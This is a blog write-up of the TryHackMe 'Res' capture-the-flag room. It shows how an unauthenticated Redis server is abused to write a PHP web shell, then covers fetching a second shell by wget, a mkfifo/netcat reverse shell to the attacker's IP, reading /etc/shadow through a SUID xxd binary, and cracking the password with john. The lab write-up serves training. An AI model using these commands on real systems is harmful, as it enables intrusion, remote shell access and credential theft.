---
title: "Res_writeup.sh"
date: 2020-10-07T17:57:40-04:00
draft: false
toc: true
featured: true
summary: "Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!"
images:
  - "img/res_cover.png"
cover: "img/res_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
---

## Res - THM Room

Hello, stranger and welcome to another writeup. This time I went for a fairly new room released on TryHackMe called `Res`. I hope you enjoy it!


- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/res).
- **PLEASE NOTE:** Passwords, flag values, or any kind of answers to the room questions were intentionally masked as required by THM writeups rules. 


### Get set-up

I'll be using the following tools during this writeup, that are not installed with Kali by default. Grab and install them before reading further.

- **Autorecon** by **Tib3rius**, grab it [here](https://github.com/Tib3rius/AutoRecon).
- **redis-cli**: Install by running `sudo apt-get install redis-tools`
- **PHP Web Shell**: by **Artyuum**, grab it [here](https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php).


### Fast Scanning and first room questions

I fired up `Autorecon` this time, and start a scan with it. While this ran I looked at what was being served in port `80`. Just a default apache page.

![Apache default page](https://i.imgur.com/V9F5cK6.png)

Autorecon also found `redis` on port `6379` and we connected using `redis-cli` and ran a simple `info` command. With this we want to check if we can run commands without having to authenticate.

![Redis - Autorecon](https://i.imgur.com/rKj55Pg.png)

> Note: If Credentials were required we would see something like this `NOAUTH Authentication is required.`

Running that command with `redis-cli` gives us the necessary information to answer the following room questions:


> **Question #1:** Scan the machine, how many ports are open?

> **Question #2:** What's is the database management system installed on the server?

> **Question #3:** What port is the database management system running on?

> **Question #4:** What's is the version of the management system installed on the server?

Having those questions answered it is time we move further with compromising the machine.


### Finding our way in and getting the user.txt flag

We need to find a way to get access into the machine, looking around for the `redis` version installed. 

Reading a bit about redis I get that we can set configurations that will be effective without any server restart. This is, settings directories and create files. This is great, we can try to upload some reverse shell possibly as long as we manage to run commands on the machine.

The first thing we need is a way to set a working directory to the writable path we known it exists `/var/www/html`. We know this from the default apache page we can see in port `80`.

So how do we set a directory in redis? good question. Let' me google about it :laughing:

It seems all it takes is using the `config set dir {path}` command, in our case it looks like this: `config set dir /var/www/html`.

Let's run that.

![redis config set dir](https://i.imgur.com/EjY0h5k.png)

It works! Now we need to see how we can create a file there.

Again this is done in a similar way, using `config set dbfilename {file}`. We can probably name the file any way we want as long as we upload a supported format.

I run `config set dbfilename shell.php` and get another `OK` back, all went well. Now we need to write to that file so we can get a chance of running commands. After some reading around, it seems we can add a single line to the file that would allow us to run commands from the URL as the apache user `www-data`. The line for our `shell.php` file looks like this: `<?php system($_GET['cmd']); ?>`

> You can read more about PHP Webshells [here](https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html).

We add the line to the file we created with `redis-cli`, by using the following command: `set {filename} "{PHP_One_liner}"`

In my case it looks like this:

![we set the one-liner to our file](https://i.imgur.com/wPL2sfV.png)

after a failed attempt it seems to work. Now we need to test this out. If we did things the way we were supposed to, we should theoretically be able to run commands through the URL. Let's put that to a test, shall we?.

To do that we need to provide a command like this: `{MachineIP}shell.php?cmd=whoami`

That didn't work, turns out I forgot an important step (what a surprise!), we need to save the changes in redis-cli by running `save`.


![We re-test our proof of time](https://i.imgur.com/LuK5PD1.png)

This time we get some information back, with this we can probably run a reverse shell back to our machine. We can also try to leverage another piece of information we got from the `redis-cli info` command. If you looked through those results, you should have noticed there was a user directory mentioned:

![There is a vianka user](https://i.imgur.com/LekQt31.png)

Let's see if we can get the user.txt flag that could very well be inside `vianka` folder.
let's say something like this: `cat /home/vianka/user.txt` we add that to our URL command like this: `{MachineIP}/shell.php?cmd=cat /home/vianka/user.txt`.

Let's give that a try:

![we try to get the user flag](https://i.imgur.com/obKEUdI.png)

It works, we got the first flag. We know how to answer the question/task #5:

> Question/Task #5 Compromise the machine and locate user.txt

Let's see how we can find the answer to the next question:

> Question #6 What is the local user account password?

We can probably try to cat the `etc/shadow` file but not sure if that would work. And it did not. Let's try to fire up a python HTTP server on whatever folder you download the `php web-shell` file (check the get set-up). And let's see if we can run a `wget http://10.13.0.34:2112/webshell.php`

That works, and if we navigate to `/webshell.php` we see the webshell loading.

![The shell loads](https://i.imgur.com/YjSjpcG.png)

Let's see if we can find any SUID, by running `find / -user root -perm -4000 -print 2>/dev/null`

This could take a bit, but eventually you should see something like this:

![we look for SUID](https://i.imgur.com/gv6Z72o.png)

We found a nice list of files were there SUID bit is set to run as root. I tried sudo but it did not work. At this point we could keep trying other files from the results, but we really need a better shell. Let's try to get a reverse shell to our kali box. We'll use the webshell we have been leveraging so far.

> Make sure to start a netcat listener on the port you want before running the command in the URL.

Let's see if we can get a reverse shell by running in the URL a netcat connection `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.34 7886 >/tmp/f`

![We run a connection to get reverse shell](https://i.imgur.com/A6FTUrm.png)

We got a reverse shell, a really basic shell. Let's see if we can upgrade it to a python TTY by running the following command `python -c 'import pty; pty.spawn("/bin/sh")'`

![We stabilize the shell a bit](https://i.imgur.com/mGUqMF0.png)
Mmm not sure that worked, anyway let's move on. 


Now let's upload linPEAS to see if we can find a way to get root or the password for www-data. Remember to make linpeas executable first `chmod +x linpeas.sh` after uploading.

![Linpeas Results](https://i.imgur.com/xy6uGr2.png)

Linpeas found that `xxd` binary has root permissions, let's see if `GTFOBins` has a way of exploiting it:

> Check out GTFObins [here](https://gtfobins.github.io/gtfobins/xxd/)

Let's see if we can read `etc/shadow` by exploiting this file as suggested by GTFOBins

```sh
LFILE=etc/shadow
xxd "$LFILE" | xxd -r
```

![we managed to read the etc/shadow](https://i.imgur.com/MI4qViX.png)

Let's see if we can use the same method to get the root.txt flag:

![we get the root.txt flag the same way](https://i.imgur.com/a6LRnn8.png)

Sweet! we got the root flag.

> If you want to learn a bit more about the etc/shadow file and how the data in it is formated, check out [this](https://www.cyberciti.biz/faq/understanding-etcshadow-file/) post.

Based on that post our hashed password is SHA-512, let's see how we can crack it and finish this room. We also learn from that post that the structure is as follows: `$id$salt$hashed`

We can try `john` like this and see if it cracks it. First we need to `unshadow` the `/etc/passwd` and `/etc/shadow` files into a hash. I showed how we used `xxd` to read the shadow file, in the same way read the contents of passwd file. Save each content to a passwd and a shadow file.

We do that like this `sudo unshadow passwd shadow > hash`

we have all those details from the shadow file, so let's run john as follows `john hash`

After a bit we got the password:

![we got the password](https://i.imgur.com/ubV8uL7.png)


And that's it for Res room. We managed to compromise redis, used URL commands to get the initial foothold and finally exploited a binary to get the flags, passwd and shadow files and we finished by cracking the password with john to obtain vianka's password.

It was a fun box, hope you enjoy it. Leave a comment, leave some feedback. Like TheCyberMentor says "talk cyber to me" :laughing:

Thank you and Happy hacking!

{{< thm_badge >}}
